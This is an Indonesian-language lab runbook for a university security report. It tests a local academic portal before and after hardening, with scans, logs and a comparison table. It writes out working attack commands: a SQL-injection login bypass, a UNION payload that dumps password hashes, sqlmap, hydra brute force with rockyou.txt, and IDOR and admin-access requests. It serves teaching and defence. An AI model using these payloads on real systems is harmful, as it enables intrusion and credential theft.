# Runbook Pengujian BAB IV — Vulnerability Assessment & Simulasi Serangan
### Portal Akademik · Before vs After Hardening

Panduan langkah-demi-langkah untuk mengisi **BAB IV** `UTS_AISS.docx`. Setiap langkah
menyebut: perintah, hasil yang diharapkan (before/after), bukti yang ditangkap, dan
**sel tabel/gambar** laporan yang diisi.

Tanda:
- 🟢 **[APP-LAYER]** sudah pernah dibuktikan lokal (XAMPP) — bisa diulang tanpa Docker.
- 🐳 **[BUTUH DOCKER]** perlu stack lengkap menyala (TLS/WAF/IAM/jaringan/Nmap).

---

## 0. Persiapan Lingkungan (Tabel 4.1)

### 0.1 Nyalakan stack BEFORE
```bash
cd portal-akademik
docker compose up -d --build
# Target: http://localhost:8080   (proxy), DB terekspos di :3306
```

### 0.2 Nyalakan stack AFTER
```bash
# tambahkan ke C:\Windows\System32\drivers\etc\hosts (sekali saja):
#   127.0.0.1 portal.local
cd ../portal-akademik-hardened
docker compose -f docker-compose.hardened.yml --env-file .env up -d --build
# Target: https://portal.local   (hanya 80->443). Terima sertifikat self-signed.
```

### 0.3 Alat uji (siapkan)
`nmap`, `curl`, `nikto` (atau OWASP ZAP), `sqlmap`, `hydra`, `testssl.sh`/`openssl`.
Di Windows paling mudah via Kali VM / WSL / container. Isi **Tabel 4.1** dengan: nama
mesin penguji, OS, alamat IP target before & after, daftar alat + versi, tanggal uji.

> **Catatan lab VirtualBox:** jalankan Docker di VM Linux (mis. Ubuntu Server) agar tidak
> mengaktifkan Hyper-V di host (konflik dengan VirtualBox). Target Nmap = IP VM tersebut.

---

## 4.2 Hasil Vulnerability Assessment

### 4.2.1 Footprinting & Banner Grabbing → **Tabel 4.2** (ancaman #20, #23)
```bash
# BEFORE
curl -sI http://localhost:8080/ | grep -iE "server|x-powered-by"
# AFTER
curl -skI https://portal.local/ | grep -iE "server|x-powered-by|strict-transport|x-frame|x-content-type|content-security"
```
**Harapan** — Before: `Server: nginx/1.27.x`, `X-Powered-By: PHP/8.2.x` (versi bocor).
After: `Server: nginx` (tanpa versi), tanpa `X-Powered-By`, muncul header keamanan (HSTS, X-Frame-Options, dll.).
**Bukti:** screenshot kedua output. Isi Tabel 4.2 kolom before/after.

### 4.2.2 Pemindaian Port & Layanan → **Tabel 4.3** (reduce attack surface, #13/#9)
```bash
# scan seluruh port + deteksi versi (ganti <target> dgn IP/host)
nmap -sS -sV -p- -Pn <target_before>    # before
nmap -sS -sV -p- -Pn <target_after>     # after
```
**Harapan** — Before: **80/8080** (http), **3306** (MySQL) terbuka. After: hanya **80**
(redirect) & **443** (https); 3306 **tertutup/filtered** (DB tidak diekspos).
**Bukti:** screenshot hasil Nmap keduanya. Isi Tabel 4.3 (port, layanan, status before/after).

### 4.2.3 Pemindaian Kerentanan → **Tabel 4.4 & 4.5**
```bash
# Opsi ringan (web): Nikto
nikto -h http://localhost:8080        # before
nikto -h https://portal.local         # after  (-ssl bila perlu)

# Opsi alternatif: OWASP ZAP baseline
docker run --rm -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t http://<target_before>
# Opsi berat sesuai panduan: OpenVAS/Nessus (bila tersedia) -> ekspor ringkasan.
```
**Harapan** — Before: temuan High/Medium (missing HTTPS, missing security headers,
cookie tanpa flag, info leakage). After: temuan turun drastis (header lengkap, HTTPS,
cookie aman). **Bukti:** ekspor laporan + screenshot ringkasan.
Isi **Tabel 4.4** (jumlah temuan per severity before/after) & **Tabel 4.5** (temuan penting + validasi manual).

---

## 4.3 Simulasi Serangan & Pembuktian Pertahanan

> Jalankan payload **identik** pada before & after. Tangkap screenshot request+response.

### 4.3.1 SQL Injection pada Login 🟢 [APP-LAYER] (#2) → tabel 4.3.1
```bash
# payload auth bypass
curl -si  "http://localhost:8080/login.php"  --data "username=admin%27%20--%20&password=x" | grep -iE "^HTTP|location"
curl -ski "https://portal.local/login.php"   --data "username=admin%27%20--%20&password=x" | grep -iE "^HTTP|location"
# sqlmap (otomatis)
sqlmap -u "http://localhost:8080/login.php" --data="username=a&password=b" --batch --risk=3 --level=5
```
**Harapan** — Before: **302 → /dashboard.php** (login sebagai admin tanpa password) / sqlmap menemukan injeksi.
After: **200** (ditolak) / sqlmap **tidak menemukan** injeksi; bila via WAF → **403 Forbidden** dari ModSecurity.
*(Sudah terbukti lokal: before 302, after 200.)*

### 4.3.2 SQL Injection UNION pada Pencarian 🟢 [APP-LAYER] (#4,#15,#17)
```bash
PAYLOAD="%' UNION SELECT username, password, role, 1 FROM users -- "
curl -sG  "http://localhost:8080/search.php" --data-urlencode "q=$PAYLOAD" -b "<cookie_before>"
curl -skG "https://portal.local/search.php"  --data-urlencode "q=$PAYLOAD" -b "<cookie_after>"
```
**Harapan** — Before: tabel hasil memuat **username + hash password** (dump kredensial).
After: **"Tidak ada hasil"** (payload diperlakukan sebagai teks) / WAF **403**.
*(Sudah terbukti lokal: before dump hash, after "Tidak ada hasil".)*

### 4.3.3 IDOR pada Kartu Hasil Studi 🟢 [APP-LAYER] (#14)
```bash
# login sbg budi dulu (simpan cookie), lalu akses NIM milik orang lain:
curl -s  "http://localhost:8080/nilai.php?nim=160423002" -b "<cookie_budi_before>" | grep -oE "Sari Wulandari|Budi Santoso"
curl -sk "https://portal.local/nilai.php?nim=160423002"  -b "<cookie_budi_after>"  | grep -oE "Sari Wulandari|Budi Santoso"
```
**Harapan** — Before: muncul **Sari Wulandari** (KHS orang lain bocor). After: tetap **Budi Santoso** (parameter diabaikan). *(Sudah terbukti lokal.)*

### 4.3.4 Akses Panel Admin Tanpa Otorisasi 🟢 [APP-LAYER] (#3,#16)
```bash
curl -si  "http://localhost:8080/admin.php" -b "<cookie_budi_before>" | head -1
curl -ski "https://portal.local/admin.php"  -b "<cookie_budi_after>"  | head -1
```
**Harapan** — Before: **200** + seluruh akun & hash tampil. After: **403 Forbidden**
(RBAC) / di stack penuh, Authelia memaksa **MFA** lebih dulu. *(Sudah terbukti lokal: 200 → 403.)*

### 4.3.5 Brute Force Login 🟢 [APP-LAYER] (#13,#1)
```bash
# hydra (ganti host/form sesuai target)
hydra -l admin -P rockyou.txt localhost -s 8080 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Username atau password salah"
```
**Harapan** — Before: brute force berjalan tanpa hambatan. After: akun **terkunci setelah 5×**
(pesan "Akun terkunci…"), **Authelia** memblokir (3× / 2 mnt), **Fail2ban** mem-ban IP.
*(Sudah terbukti lokal: lockout + baris AUTH_FAIL ter-log.)* Bukti: screenshot + `docker compose logs`.

### 4.3.6 Transport, Banner & Sesi 🐳 [BUTUH DOCKER] (#23,#20,#21,#22)
```bash
# TLS: protokol & cipher
nmap --script ssl-enum-ciphers -p 443 <target_after>
testssl.sh https://portal.local            # atau: openssl s_client -connect portal.local:443
# Redirect HTTP->HTTPS
curl -sI http://portal.local/ | grep -i location
# Cookie sesi (flag)
curl -skI https://portal.local/login.php | grep -i set-cookie
# Sniffing (Wireshark): login di before (HTTP) vs after (HTTPS)
```
**Harapan** — Before: HTTP polos, kredensial terbaca di Wireshark, cookie tanpa flag.
After: TLS1.2/1.3, redirect 301→443, cookie **HttpOnly; Secure; SameSite=Lax**, trafik terenkripsi.

### 4.3.7 Data pada Penyimpanan 🟢 [APP-LAYER] (#12,#17,#18,#19)
```bash
# Lihat isi mentah DB (butuh akses DB; di after DB tidak diekspos -> via exec):
docker compose -f docker-compose.hardened.yml exec db \
  mariadb -uroot -p"$MARIADB_ROOT_PASSWORD" portal_akademik \
  -e "SELECT username,LEFT(password,13) pw, LEFT(no_telp,16) telp FROM users JOIN mahasiswa USING(nim) LIMIT 2;"
```
**Harapan** — Before: password **MD5** (32 hex), PII **plaintext**. After: password **$argon2id$…**,
PII **ciphertext base64** (AES-256-GCM); hanya admin yang melihat versi terdekripsi di `/admin.php`.
*(Sudah terbukti lokal: hash argon2id + PII ciphertext.)*

---

## 4.4 Analisis Log Serangan → **Tabel 4.6** (#6)
Untuk tiap serangan di atas, ambil cuplikan log yang mencatatnya:
```bash
# Log aplikasi (gagal login)
docker compose -f docker-compose.hardened.yml exec app tail -n 30 /var/log/portal/app.log   # baris AUTH_FAIL
# Log WAF ModSecurity (payload diblokir)
docker compose -f docker-compose.hardened.yml logs waf | grep -i "ModSecurity\|denied\|403"
# Authelia (regulasi/ban, autentikasi)
docker compose -f docker-compose.hardened.yml logs authelia | grep -iE "authentication|regulation|banned"
# Fail2ban (IP di-ban)
docker compose -f docker-compose.hardened.yml exec fail2ban fail2ban-client status portal-auth
# Nginx access (401/403 dari Authelia/WAF)
docker compose -f docker-compose.hardened.yml exec proxy tail -n 30 /var/log/nginx/access.log
```
Isi Tabel 4.6: sumber log → kejadian yang tercatat → ancaman terkait. Tunjukkan serangan
**terdeteksi & tercatat**, bukan hanya diblokir.

---

## 4.5 Ringkasan Perbandingan → **Tabel 4.7**
Rekap semua pengujian jadi satu tabel. Kolom: Serangan | Ancaman | Hasil Before | Hasil After | Kontrol yang menahan | Status (Terbukti/Belum).

| Serangan | Before | After | Kontrol |
|---|---|---|---|
| SQLi login (#2) | login sbg admin | ditolak/403 | prepared stmt + WAF |
| UNION SQLi (#4,#15,#17) | dump hash+PII | "tidak ada hasil" | prepared stmt + WAF |
| IDOR KHS (#14) | KHS orang lain | KHS sendiri | kontrol kepemilikan |
| Admin tanpa otorisasi (#3,#16) | akun+hash bocor | 403 + MFA | RBAC + Authelia |
| Brute force (#13,#1) | tanpa batas | lockout+ban | app lockout+Authelia+Fail2ban |
| Transport (#23) | HTTP, sniff | TLS1.2/1.3 | HTTPS+HSTS |
| Data at rest (#12,#17,#18) | MD5+plaintext | Argon2id+AES | hashing+enkripsi |

---

## Lampiran A — Checklist Bukti (tandai saat selesai)
- [ ] Tabel 4.1 lingkungan uji terisi
- [ ] Screenshot banner before/after (4.2.1)
- [ ] Screenshot Nmap before/after (4.2.2)
- [ ] Laporan Nikto/ZAP before/after (4.2.3)
- [ ] Screenshot 7 simulasi serangan (4.3.1–4.3.7), masing-masing before & after
- [ ] Cuplikan log (app/WAF/Authelia/Fail2ban/nginx) (4.4)
- [ ] Wireshark: HTTP (before) vs HTTPS (after)
- [ ] Screenshot MFA Authelia (TOTP) saat buka /admin.php
- [ ] Tabel 4.7 lengkap + kolom status "Terbukti"

> **Tips penamaan bukti:** `before_4-3-1_sqli-login.png`, `after_4-3-1_sqli-login.png`, dst.,
> agar mudah dirujuk di laporan.
